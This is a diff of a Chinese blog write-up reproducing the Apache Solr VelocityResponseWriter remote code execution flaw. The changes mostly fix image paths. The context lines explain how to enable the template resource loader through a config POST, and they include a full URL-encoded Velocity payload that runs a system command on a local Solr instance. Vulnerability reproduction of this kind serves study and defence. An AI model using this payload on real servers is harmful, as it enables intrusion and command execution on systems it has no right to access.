@@ -25,11 +25,11 @@ https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/
 
 解压压缩包，启动solr
 
-![1573479758591](D:\hacker book\blog\VWRAT\image\1573479758591.png)
+![1573479758591](image\1573479758591.png)
 
 访问http://127.0.0.1:8983/solr/#/~cores/new_core，添加new_core
 
-![](D:\hacker book\blog\VWRAT\image\1573479895996.png)
+![](image\1573479895996.png)
 
 ## 四、漏洞复现
 
@@ -37,11 +37,11 @@ https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/
 
 访问http://127.0.0.1:8983/solr/admin/cores?wt=json&indexInfo=false
 
-![1573480278213](D:\hacker book\blog\VWRAT\image\1573480278213.png)
+![1573480278213](image\1573480278213.png)
 
 Apache Solr默认集成VelocityResponseWriter插件，该插件初始化参数中的params.resource.loader.enabled默认值设置为false，但是可以通过POST请求直接修改集合设置，将其设置为true，然后就可以构造特殊的GET请求来实现远程代码执行。
 
-![1573482066083](D:\hacker book\blog\VWRAT\image\1573482066083.png)
+![1573482066083](\image\1573482066083.png)
 
 post以下数据，返回200响应码
 
@@ -55,10 +55,10 @@ post以下数据，返回200响应码
             "params.resource.loader.enabled": "true"
             }
         }
-![1573482566107](D:\hacker book\blog\VWRAT\image\1573482566107.png)
+![1573482566107](\image\1573482566107.png)
 
 构造paloayer实现rce:
 
 [http://127.0.0.1:8983/solr/new_core/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%22id%22))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()\])$str.valueOf($chr.toChars($out.read()))%23end](http://127.0.0.1:8983/solr/new_core/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName('java.lang.String'))+%23set($ex=$rt.getRuntime().exec("id"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end)
 
-![1573482681109](D:\hacker book\blog\VWRAT\image\1573482681109.png)
+![1573482681109](image\1573482681109.png)
